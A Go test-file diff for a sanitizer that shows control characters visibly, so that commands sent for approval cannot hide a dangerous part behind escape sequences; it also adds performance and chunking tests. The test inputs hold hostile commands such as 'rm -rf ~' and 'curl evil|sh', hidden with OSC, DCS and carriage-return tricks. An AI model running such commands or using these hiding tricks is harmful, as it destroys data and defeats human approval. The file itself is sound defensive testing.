@@ -3,6 +3,7 @@ package render
 import (
 	"strings"
 	"testing"
+	"time"
 )
 
 // Untrusted text (a file's first line, a web page, a command the model wrote)
@@ -125,5 +126,111 @@ func TestStreamSanitizerDoesNotHoldBackUnboundedInput(t *testing.T) {
 	}
 	if strings.ContainsRune(got, 0x1b) {
 		t.Fatalf("escape leaked: %q", got[:40])
+	}
+}
+
+// StripControls drops what it removes, which is right for a header but wrong
+// for text shown for approval: the dropped bytes still reach bash. An
+// unterminated OSC discarded everything after it, a complete OSC took its
+// whole body with it, and ESC + ';' or '|' ate the separator, so the prompt
+// showed a harmless command while the hidden part would run.
+func TestVisibleControlsHidesNothing(t *testing.T) {
+	cases := []struct{ in, mustShow string }{
+		{"echo hello \x1b] ; rm -rf ~", "; rm -rf ~"},
+		{"echo hi\x1b]0;x; curl evil|sh\x07 done", "curl evil|sh"},
+		{"a\x1b;b\x1b|c\x1b&d", ";b"},
+		{"a\x1b;b\x1b|c\x1b&d", "|c"},
+		{"a\x1b;b\x1b|c\x1b&d", "&d"},
+		{"x\x1bPq; rm -rf /\x1b\\ y", "; rm -rf /"},
+		{"rm -rf ~\rls -la", "rm -rf ~"},
+		{"rm -rf ~\rls -la", "ls -la"},
+		{"a\u009b2Jb", "2Jb"},
+		{"a‮b", "b"},
+	}
+	for _, c := range cases {
+		got := VisibleControls(c.in)
+		if !strings.Contains(got, c.mustShow) {
+			t.Errorf("VisibleControls(%q) = %q hides %q", c.in, got, c.mustShow)
+		}
+		if strings.ContainsAny(got, "\x1b\a\r\b\u009b\u009d‮") {
+			t.Errorf("VisibleControls(%q) = %q still carries a raw control", c.in, got)
+		}
+	}
+	if got := VisibleControls("echo hi\x1b]0;x\x07"); got != `echo hi\e]0;x^G` {
+		t.Errorf("got %q, want %q", got, `echo hi\e]0;x^G`)
+	}
+	if got := VisibleControls("第一行\n\tsecond ✓"); got != "第一行\n\tsecond ✓" {
+		t.Errorf("plain text changed: %q", got)
+	}
+	if got := VisibleControls("bad\xffbyte"); got != `bad\xffbyte` {
+		t.Errorf("invalid byte: %q", got)
+	}
+}
+
+func TestVisibleControlsRendersEveryHostileSequence(t *testing.T) {
+	for name, seq := range hostileSequences {
+		got := VisibleControls("a" + seq + "b")
+		if strings.ContainsAny(got, "\x1b\a\b\u009b\u009d") {
+			t.Errorf("%s: %q still carries a control character", name, got)
+		}
+		if !strings.HasPrefix(got, "a") || !strings.HasSuffix(got, "b") {
+			t.Errorf("%s: %q lost the surrounding text", name, got)
+		}
+	}
+}
+
+// Every overlong unterminated sequence used to be rescanned after dropping
+// two bytes, so 160 KB of "\x1b]" took seconds and froze the UI.
+func TestStreamSanitizerIsLinearOnLongUnterminatedSequences(t *testing.T) {
+	in := strings.Repeat("\x1b]", 80_000)
+	start := time.Now()
+	var z StreamSanitizer
+	z.Write(in)
+	z.Flush()
+	if el := time.Since(start); el > 200*time.Millisecond {
+		t.Fatalf("Write took %v on %d bytes", el, len(in))
+	}
+	start = time.Now()
+	z = StreamSanitizer{}
+	for i := 0; i < 1000; i++ {
+		z.Write(strings.Repeat("\x1b[", 80))
+	}
+	if el := time.Since(start); el > 200*time.Millisecond {
+		t.Fatalf("chunked Write took %v", el)
+	}
+}
+
+// An OSC inside one chunk is dropped whole; the same OSC over 256 bytes split
+// across chunks used to have its body printed as text. Whatever the chunking,
+// the stream now comes out exactly as SanitizeStream of the whole text.
+func TestStreamSanitizerTreatsALongSequenceTheSameWhateverTheChunking(t *testing.T) {
+	inputs := []string{
+		"before \x1b]52;c;" + strings.Repeat("A", 300) + "\x07 after",
+		"before \x1b]52;c;" + strings.Repeat("A", 3000) + "\x07 after",
+		"x\x1b]0;" + strings.Repeat("B", 400) + "\x1b\\y",
+		"p\x1b[" + strings.Repeat("1;", 600) + "mq",
+		"n\x1b" + strings.Repeat(" ", 900) + "0m",
+		strings.Repeat("\x1b]", 700) + "tail",
+	}
+	for _, in := range inputs {
+		want := SanitizeStream(in)
+		if strings.ContainsAny(want, "\x1b\a") {
+			t.Errorf("SanitizeStream(%.20q...) let a control through: %.60q", in, want)
+		}
+		for _, size := range []int{1, 7, 100, 255, 256, 257, 1000} {
+			var z StreamSanitizer
+			var sb strings.Builder
+			for i := 0; i < len(in); i += size {
+				sb.WriteString(z.Write(in[i:min(len(in), i+size)]))
+			}
+			sb.WriteString(z.Flush())
+			if got := sb.String(); got != want {
+				t.Errorf("chunks of %d: %.20q... came out as %.80q, want %.80q", size, in, got, want)
+			}
+		}
+	}
+	// A complete OSC of ordinary length is still dropped whole.
+	if got := SanitizeStream("a\x1b]0;" + strings.Repeat("t", 200) + "\x07b"); got != "ab" {
+		t.Errorf("got %q", got)
 	}
 }
